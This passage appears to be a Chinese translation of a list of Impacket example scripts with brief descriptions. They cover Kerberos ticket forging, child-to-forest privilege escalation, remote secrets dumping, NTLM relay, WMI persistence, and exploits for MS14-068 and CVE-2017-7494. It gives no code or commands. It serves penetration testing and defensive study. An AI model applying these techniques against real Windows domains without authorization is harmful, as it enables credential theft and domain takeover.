	- 从头开始或基于模板（根据KDC的合法请求）创建金/银票据，允许您在PAC_LOGON_INFO结构中自定义设置的一些参数，特别是组、外接程序、持续时间等。
+ raiseChild.py
	- 通过（ab）使用Golden Tickets和ExtraSids的基础来实现子域到林权限的升级。
+ samrdump.py
	- 从MSRPC套件与安全帐户管理器远程接口通信的应用程序中。它列出了通过此服务导出的系统用户帐户、可用资源共享和其他敏感信息。
+ secretsdump.py
	- 执行各种技术从远程机器转储Secrets。
+ mimikatz.py
	- 远程mimikatz RPC服务器的迷你shell。
+ ntlmrelayx.py
	- 此脚本执行NTLM中继攻击，设置SMB和HTTP服务器并将凭据中继到许多不同的协议。
+ karmaSMB.py
	- 无论指定的SMB共享和路径名如何，都会响应特定文件内容的SMB服务器。
+ smbserver.py
	- SMB服务器的Python实现，允许快速设置共享和用户帐户。
+ smbclient.py
	- 通用的SMB客户端。
+ wmiquery.py
	- 它允许发出WQL查询并在目标系统上获取WMI对象的描述（例如，从win32_account中选择名称）
+ wmipersist.py
	- 此脚本创建/删除wmi事件使用者/筛选器，并在两者之间建立链接，以基于指定的wql筛选器或计时器执行Visual Basic Basic。
+ lookupsid.py
	- 安全标识符（SID）是可变长度的唯一值，用于标识用户帐户，通过[MS-LSAT] MSRPC接口的Windows SID暴力破解查找远程用户和组。
+ reg.py
	- 通过[ms-rrp]msrpc接口远程注册表操作工具。
+ rpcdump.py
	- 转储目标上注册的RPC端点和字符串绑定列表,它还将尝试将它们与已知端点列表进行匹配。
+ opdump.py
	- 这将绑定到给定的hostname:port和msrpc接口。然后，它尝试依次调用前256个操作号中的每一个，并报告每个调用的结果。
+ services.py
	- 此脚本可用于通过[MS-SCMR] MSRPC接口操作Windows服务。它支持启动，停止，删除，状态，配置，列表，创建和更改。
+ getArch.py
	- 此脚本将与目标（或目标列表）主机连接，并使用文档化的msrpc功能收集由（ab）安装的操作系统体系结构类型。
+ netview.py
	- 获取在远程主机上打开的会话列表，并跟踪这些会话在找到的主机上循环，并跟踪从远程服务器登录/退出的用户。
+ goldenPac.py
	- 利用MS14-068。保存Golden Ticket并在目标位置启动PSExec会话。
+ sambaPipe.py
	- 该脚本将利用CVE-2017-7494，通过-so参数上传和执行用户指定的共享库。
+ smbrelayx.py
	- 利用SMB中继攻击漏洞CVE-2015-0005。如果目标系统正在执行签名并且提供了计算机帐户，则模块将尝试通过NETLOGON收集SMB会话密钥。
+ mssqlinstance.py
	- 从目标主机中检索MSSQL实例名称。
+ mssqlclient.py
	- MSSQL客户端,支持SQL和Windows身份验证（哈希）.它还支持TLS。
+ registry-read.py
	- Windwows注册表文件格式实现。它允许解析脱机注册表配置单元.
+ GetADUsers.py
	- 此脚本将收集有关域用户及其相应电子邮件地址的数据。它还将包括有关上次登录和上次密码设置属性的一些额外信息。
+ ping.py
	- 简单的ICMP ping。
+ ping6.py
	- 简单的IPv6 ICMP ping，它使用ICMP echo和echo-reply数据包来检查主机的状态。
